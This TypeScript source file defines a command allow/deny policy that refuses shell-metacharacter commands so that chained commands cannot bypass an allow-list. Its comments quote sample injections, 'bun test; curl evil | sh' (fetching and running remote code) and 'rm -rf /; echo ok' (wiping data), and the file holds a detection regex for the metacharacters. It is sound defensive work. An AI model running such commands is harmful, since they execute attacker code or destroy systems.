/**
 * Command allow/deny policy for the quality runner.
 *
 * `run_quality` executes commands sourced from the host config. That is a
 * trust boundary: a host that exposes the quality plugin to a less-trusted
 * agent may want to restrict WHICH binaries can be spawned. This policy is the
 * agnostic mechanism — pure, opt-in, and enforced before any `spawn`. With no
 * policy the behaviour is unchanged (the commands are the host's own).
 *
 * a00065 S3 — the policy is now a real boundary, not a first-token hint.
 * The runner feeds each command to `bash -c "<string>"`, so a command like
 * `bun test; curl evil | sh` would run `curl` even though its first token
 * (`bun`) is allow-listed. To close that bypass, when a policy is ACTIVE
 * (a non-empty `allow` or `deny`) a command carrying shell metacharacters is
 * denied outright — under a policy every command must be a single
 * `binary arg arg` invocation the allow/deny verdict can actually reason
 * about. Hosts that legitimately need shell pipelines simply run WITHOUT a
 * restrictive policy (the commands are their own, trusted config).
 */

export interface ICommandPolicy {
	/** If non-empty, only these binaries (the command's first token) may run. */
	readonly allow?: readonly string[];
	/** Binaries that are always blocked. Takes precedence over `allow`. */
	readonly deny?: readonly string[];
}

export interface IPolicyVerdict {
	readonly allowed: boolean;
	readonly reason?: string;
}

/** The binary a command invokes: its first whitespace-delimited token. */
export const commandBinary = (command: string): string =>
	command.trim().split(/\s+/)[0] ?? '';

/**
 * Shell metacharacters that let a single string smuggle a second command
 * past a first-token allow-list check once it reaches `bash -c`:
 * command separators (`;` `&` `|`), substitution (`` ` `` `$(`), redirection
 * (`<` `>`), and raw newlines. Detecting ANY of these is enough — we don't
 * try to parse the shell grammar, we refuse the class.
 */
const SHELL_METACHARACTERS = /[;&|`<>\n\r]|\$\(/;

/**
 * True when this policy is being used as a trust boundary (it actually
 * constrains something). An all-empty policy object is treated as "no
 * boundary" so the metacharacter guard doesn't fire on trusted host config.
 */
const policyIsActive = (policy: ICommandPolicy): boolean =>
	(policy.allow !== undefined && policy.allow.length > 0) ||
	(policy.deny !== undefined && policy.deny.length > 0);

/**
 * Decide whether a command may run. Deny wins over everything; under an
 * active policy a shell-metacharacter command is refused; an empty/absent
 * allow list means "any binary not denied".
 */
export const evaluateCommandPolicy = (
	command: string,
	policy?: ICommandPolicy,
): IPolicyVerdict => {
	if (policy === undefined) return { allowed: true };
	const bin = commandBinary(command);
	// Deny is absolute — checked first so a denied binary is blocked even
	// when it is also trying to chain (`rm -rf /; echo ok`).
	if (policy.deny?.includes(bin)) {
		return {
			allowed: false,
			reason: `command "${bin}" is in the deny list`,
		};
	}
	if (policyIsActive(policy) && SHELL_METACHARACTERS.test(command)) {
		return {
			allowed: false,
			reason: `command contains a shell metacharacter that could bypass the allow/deny policy — under a command policy each command must be a single "binary args" invocation`,
		};
	}
	if (
		policy.allow &&
		policy.allow.length > 0 &&
		!policy.allow.includes(bin)
	) {
		return {
			allowed: false,
			reason: `command "${bin}" is not in the allow list`,
		};
	}
	return { allowed: true };
};
